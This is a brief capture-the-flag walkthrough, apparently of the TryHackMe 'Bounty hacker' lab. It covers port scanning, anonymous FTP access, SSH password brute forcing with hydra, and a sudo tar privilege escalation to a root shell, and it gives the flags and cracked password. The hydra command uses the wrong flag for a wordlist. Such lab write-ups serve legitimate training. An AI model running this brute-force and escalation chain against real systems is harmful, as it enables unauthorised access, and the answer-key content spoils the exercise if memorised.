Bounty hacker

Task 1 : Deploy the machine (Deployed it)

Task 2 : Find open ports
Used nmap -sC -sV <given ip>
open ports are - 21(ftp), 22(ssh) and 80(http)

Task 3 : Who wrote the task list 
Checked the open ports and directories, nothing useful. So we exploit ftp, port 21. Used the following command on my device
ftp <given ip>
username : anonymous
Found 2 files there, locks.txt(contains list of passwords) and task.txt(here we find the username, lin)

Task 4 :  What service can you bruteforce with the text file found? 
SSH

Task 5 : User's password
Used hydra for password cracking using the following command
hydra -l lin -p locks.txt <given ip> ssh
The password is RedDr4gonSynd1cat3

Task 6 : User.txt
command cat user.txt
flag THM{CR1M3_SyNd1C4T3}

Task 7 : root.txt
Command sudo -l 
file is in /bin/tar who requires root access
google how to exploit tar. found the command in gtfobin
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
now, find root.txt file
cat root.txt
flag THM{80UN7Y_h4cK3r}
